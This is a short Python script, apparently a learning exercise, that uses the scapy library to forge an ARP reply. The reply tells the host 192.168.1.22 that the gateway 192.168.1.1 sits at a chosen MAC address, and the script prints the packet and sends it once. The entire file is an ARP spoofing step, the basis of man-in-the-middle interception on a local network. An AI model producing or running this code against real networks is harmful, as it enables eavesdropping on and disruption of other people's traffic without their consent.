#!usr/bin/env python
import scapy.all as scapy
pact=scapy.ARP(op=2,pdst="192.168.1.22",hwdst="44:85:00:D3:CA:98",psrc="192.168.1.1")
print(pact.show())
print(pact.summary())
scapy.send(pact)
